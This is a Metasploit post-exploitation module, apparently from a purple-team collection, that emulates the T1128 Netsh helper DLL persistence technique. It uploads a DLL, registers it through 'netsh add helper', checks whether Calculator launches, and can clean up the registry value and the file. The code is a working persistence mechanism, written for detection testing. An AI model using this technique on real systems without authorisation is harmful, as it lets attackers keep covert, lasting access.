    ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Exploit::FileDropper


  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Netsh Helper DLL (T1128) Windows - Purple Team",
      'Description'          => %q{
        Persistence:
        Netsh.exe (also referred to as Netshell) is a command-line scripting
        utility used to interact with the network configuration of a system.
        It contains functionality to add helper DLLs for extending functionality
        of the utility. The paths to registered netsh.exe helper DLLs are entered
        into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1128' ] ],
      'Author'               => ['Praetorian']
    ))

    register_options(
      [
        OptString.new('SCRIPT',  [true, 'Command string to execute.', 'netsh add helper C:\t1128.dll']),
        OptString.new('RPATH', [ true, 'Remote file path to upload the file to.', 'C:\\t1128.dll' ]),
        OptString.new('DLLPATH', [true, 'Local path to the DLL to load and run.', 'data/purple/t1128/nethelper_x64.dll']),
        OptString.new('PROCESSNAME', [true, 'Process name to grep for to verify command executed.', 'Calculator']),
        OptBool.new("CLEANUP", [true, "Restore service paramters after execution.", true])
      ]
    )
  end

  def run
    begin
      # Make sure we meet the requirements before running the script, note no need to return
      # unless error
      unless is_admin?
        fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
      end

      cleanup = datastore['CLEANUP']

      # Upload our DLL
      dll_rpath = datastore['RPATH']
      print_status("Uploading file...")
      unless file?(dll_rpath)
        upload_file(dll_rpath, datastore['DLLPATH'])
      end

      # Execute in session
      run_cmd(datastore['SCRIPT'])

      sleep(2)
      print_status("Checking for calc")
      kill_calc(true)

      if cleanup
        print_status("Removing the registry key...")
        registry_deleteval("HKLM\\SOFTWARE\\Microsoft\\NetSh","t1128")
        #print_status(cmd_exec('reg delete HKLM\Software\Microsoft\NetSh /v t1128 /F'))
        register_files_for_cleanup(dll_rpath)
      end
      print_good("Module T1128W execution succesful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1128W execution failed.")
    end
  end
end
